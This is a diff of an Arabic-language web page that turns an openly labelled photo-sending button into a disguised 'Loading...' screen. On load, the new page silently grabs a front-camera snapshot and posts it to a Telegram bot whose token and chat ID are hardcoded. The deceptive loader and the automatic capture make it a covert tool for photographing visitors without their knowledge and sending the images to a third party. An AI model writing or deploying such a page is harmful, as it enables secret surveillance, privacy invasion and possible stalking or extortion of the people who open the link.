@@ -2,62 +2,91 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>كاميرا البوت</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحميل...</title>
     <style>
-        body { background: #1a1a2e; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
-        button { background: #e94560; color: white; border: none; padding: 20px 40px; border-radius: 50px; font-size: 20px; cursor: pointer; }
+        /* تصميم يشبه الصورة في ملف 99862.jpg */
+        body { 
+            background-color: #000; 
+            color: white; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            font-family: sans-serif; 
+        }
+        .loader {
+            border: 4px solid #333;
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .text { font-size: 1.2rem; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <button id="capture-btn">التقط صورة وأرسلها 📸</button>
-    <p id="status"></p>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <div class="loader"></div>
+    <div class="text">لحظه وحده من فضلك...</div>
+
+    <canvas id="canvas"></canvas>
 
 <script>
     const TELEGRAM_TOKEN = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
-    const CHAT_ID = '8169635171'; // هذا هو الآيدي الذي زودتني به سابقاً
+    const CHAT_ID = '8169635171';
 
-    const captureBtn = document.getElementById('capture-btn');
-    const statusText = document.getElementById('status');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
+    async function startCapture() {
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
 
-    captureBtn.addEventListener('click', async () => {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            // طلب الإذن تلقائياً عند فتح الصفحة كما في ملف 99863.jpg
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
 
-            setTimeout(async () => {
+            // الانتظار قليلاً للتأكد من وضوح الصورة
+            setTimeout(() => {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // إيقاف الكاميرا بعد الالتقاط
                 stream.getTracks().forEach(track => track.stop());
 
-                canvas.toBlob(async (blob) => {
+                // إرسال الصورة إلى تلجرام
+                canvas.toBlob((blob) => {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
                     formData.append('photo', blob, 'image.png');
 
-                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
-                    
-                    const result = await response.json();
-                    if(result.ok) {
-                        statusText.innerText = "✅ تم الإرسال بنجاح!";
-                    } else {
-                        statusText.innerText = "❌ خطأ: " + result.description;
-                    }
                 }, 'image/png');
             }, 1000);
-        } catch (e) {
-            statusText.innerText = "❌ تعذر الوصول للكاميرا";
+
+        } catch (error) {
+            console.log("رفض المستخدم الإذن أو حدث خطأ");
         }
-    });
+    }
+
+    // تشغيل الدالة بمجرد تحميل الصفحة
+    window.onload = startCapture;
 </script>
+
 </body>
 </html>
